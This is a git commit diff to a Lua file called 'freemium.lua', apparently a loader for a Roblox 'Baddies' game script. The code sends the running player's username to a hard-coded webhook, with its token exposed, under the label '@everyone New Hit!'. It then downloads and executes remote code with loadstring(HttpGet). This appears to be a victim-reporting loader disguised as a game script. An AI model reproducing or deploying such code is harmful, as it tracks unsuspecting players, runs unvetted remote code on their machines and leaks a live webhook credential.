dd2d4e23c6856ef238023e5e7b2db1299bde50f4
Baddiesbestscripts <c31284866@gmail.com>
2026-04-17 12:51:18 +0000

    Update freemium.lua

--- freemium.lua
+++ freemium.lua
@@ -1,4 +1,4 @@
--- Your Own Loader
+-- Simple Loader
 
 _G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1494661669849268365/mKzWrChl1qbxDMuG_w9WQyRS4W03KuSQigicg6y__FCCCftfUQoe9QkFfKd5ApNmlEfc"
 
@@ -6,20 +6,15 @@ _G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- Change this
 
 _G.PING_POOR = true
 
--- Send notification when someone runs it
 task.spawn(function()
     if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
         local http = game:GetService("HttpService")
         local plr = game.Players.LocalPlayer
-        local executor = identifyexecutor and identifyexecutor() or "Unknown"
-
-        local message = "@everyone New Hit!\nUsername: " .. plr.Name .. "\nExecutor: " .. executor .. "\nGame: " .. game.PlaceId
-
+        local message = "@everyone New Hit! Username: " .. plr.Name
         game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = message}))
     end
 end)
 
--- Load the main Baddies script
 task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
 end)
